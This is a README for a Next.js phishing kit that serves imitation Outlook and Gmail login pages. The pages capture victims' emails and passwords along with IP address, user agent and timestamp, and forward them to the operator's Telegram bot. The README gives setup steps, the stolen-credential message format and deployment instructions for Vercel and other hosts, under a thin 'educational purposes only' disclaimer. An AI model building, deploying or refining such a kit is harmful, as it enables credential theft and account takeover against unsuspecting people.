# Next.js Login Pages with Telegram Bot Integration

Modern Next.js application with realistic Outlook and Gmail login pages that capture user credentials and send them to a Telegram bot.

## Features

- 🎨 **Pixel-perfect designs** - Outlook and Gmail login pages
- 📱 **Real-time Telegram notifications** - Instant credential capture
- 🔒 **Form validation** - Client and server-side validation
- 📊 **User tracking** - IP address, User Agent, and timestamp
- 🚀 **Modern stack** - Next.js 15, TypeScript, Tailwind CSS
- ⚡ **Serverless** - Optimized for Vercel deployment

## Quick Start

### 1. Install Dependencies

```bash
npm install
```

### 2. Set Environment Variables

Create `.env.local` file:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

### 3. Run Development Server

```bash
npm run dev
```

Visit: `http://localhost:3000`

## Pages

- **`/`** - Outlook login page
- **`/gmail`** - Gmail login page
- **`/api/login`** - Outlook login API endpoint
- **`/api/gmail-login`** - Gmail login API endpoint
- **`/api/health`** - Health check endpoint

## How It Works

1. User visits login page (Outlook or Gmail)
2. User enters credentials
3. Form submits to Next.js API route
4. API captures additional info (IP, User Agent, timestamp)
5. Data sent to Telegram bot
6. You receive formatted message with credentials

## Telegram Message Format

```
🔐 **New Login Attempt - Outlook**

📧 **Email:** user@example.com
🔑 **Password:** theirpassword
📍 **IP Address:** 192.168.1.1
⏰ **Time:** 12/25/2023, 3:45:30 PM
```

## File Structure

```
├── src/
│   └── app/
│       ├── api/
│       │   ├── login/route.ts      # Outlook API
│       │   ├── gmail-login/route.ts # Gmail API
│       │   └── health/route.ts     # Health check
│       ├── gmail/page.tsx          # Gmail login page
│       ├── page.tsx                # Outlook login page
│       └── layout.tsx              # Root layout
├── package.json
├── next.config.ts
└── .env.local
```

## Deployment

### Vercel (Recommended)

1. Push to GitHub
2. Connect repository to Vercel
3. Set environment variables
4. Deploy!

### Other Platforms

- **Netlify** - Works with Next.js
- **Railway** - Full-stack deployment
- **DigitalOcean** - App Platform

## Development

```bash
# Install dependencies
npm install

# Run development server
npm run dev

# Build for production
npm run build

# Start production server
npm start
```

## Security Notes

⚠️ **This is for educational purposes only. Always ensure you have proper authorization before using this tool.**

## License

MIT License - Use responsibly and ethically.